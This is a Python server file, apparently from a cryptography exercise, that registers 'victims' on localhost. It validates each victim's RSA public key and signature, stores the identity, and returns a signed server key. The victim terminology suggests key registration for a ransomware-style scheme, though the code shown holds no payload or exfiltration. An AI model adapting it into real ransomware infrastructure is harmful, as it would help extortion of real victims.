
import base64
import binascii
import socket

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from compartido.autenticacion import verificar_registro_victima
from compartido.protocolo import (
    enviar_mensaje,
    recibir_mensaje
)

from servidor.almacenamiento import (
    preparar_servidor,
    registrar_identidad
)

from servidor.firmas_servidor import (
    preparar_firmas_servidor,
    firmar_respuesta_registro
)


HOST = "127.0.0.1"
PUERTO = 5000


def procesar_registro(mensaje, identidad_servidor,
                      carpeta_registros=None):
    """Valida un registro y construye la respuesta."""

    if mensaje.get("tipo") != "registro":
        raise ValueError("Tipo de mensaje no admitido")

    id_victima = mensaje.get("idV")
    clave_b64 = mensaje.get("pkV")

    if not isinstance(id_victima, str) or not id_victima:
        raise ValueError("Identificador invalido")

    if len(id_victima) > 128:
        raise ValueError("Identificador demasiado largo")

    if not isinstance(clave_b64, str):
        raise ValueError("Clave publica ausente")

    try:
        datos_clave = base64.b64decode(
            clave_b64, validate=True
        )

        clave_victima = serialization.load_pem_public_key(
            datos_clave
        )
    except (ValueError, binascii.Error) as error:
        raise ValueError("Clave publica invalida") from error

    if not isinstance(clave_victima, rsa.RSAPublicKey):
        raise ValueError("La clave publica debe ser RSA")

    if clave_victima.key_size < 2048:
        raise ValueError("La clave RSA es demasiado corta")
    
    # Comprobar que la victima posee su clave privada RSA
    firma_b64 = mensaje.get("firmaV")

    if not isinstance(firma_b64, str) or not firma_b64:
        raise ValueError("Falta firma de la victima")

    try:
        firma = base64.b64decode(
            firma_b64,
            validate=True
        )
    except binascii.Error as error:
        raise ValueError(
            "Firma de la victima mal codificada"
        ) from error

    if not verificar_registro_victima(
        clave_victima,
        id_victima,
        clave_b64,
        firma
    ):
        raise ValueError(
            "Firma de la victima invalida"
        )

    if carpeta_registros is None:
        registrar_identidad(id_victima, clave_b64)
    else:
        registrar_identidad(
            id_victima, clave_b64, carpeta_registros
        )

    clave_servidor_pem = identidad_servidor[
        "publica"
    ].public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

    respuesta = {
        "tipo": "registro_ok",
        "idV": id_victima,
        "pkS": base64.b64encode(
            clave_servidor_pem
        ).decode("ascii")
    }

    # Preparar las claves de firma Ed25519
    claves_firma = preparar_firmas_servidor()

    # Firmar la respuesta
    respuesta_firmada = firmar_respuesta_registro(
        respuesta,
        claves_firma["privada"]
    )

   
    return respuesta_firmada



def iniciar_servidor():
    identidad = preparar_servidor()

    with socket.socket(
        socket.AF_INET, socket.SOCK_STREAM
    ) as escucha:

        escucha.setsockopt(
            socket.SOL_SOCKET,
            socket.SO_REUSEADDR,
            1
        )

        escucha.bind((HOST, PUERTO))
        escucha.listen(5)

        print("=== SERVIDOR DE CRIPTOGRAFIA ===")
        print(f"Escuchando en {HOST}:{PUERTO}")

        while True:
            conexion, direccion = escucha.accept()

            with conexion:
                conexion.settimeout(5)

                try:
                    mensaje = recibir_mensaje(conexion)

                    respuesta = procesar_registro(
                        mensaje, identidad
                    )

                    enviar_mensaje(conexion, respuesta)

                    print(
                        "Registro aceptado:",
                        respuesta["idV"]
                    )

                except (
                    ValueError,
                    OSError,
                    ConnectionError
                ) as error:

                    print("Solicitud rechazada:", error)

                    try:
                        enviar_mensaje(conexion, {
                            "tipo": "error",
                            "mensaje": str(error)
                        })
                    except OSError:
                        pass


if __name__ == "__main__":
    try:
        iniciar_servidor()
    except KeyboardInterrupt:
        print("\nServidor detenido.")
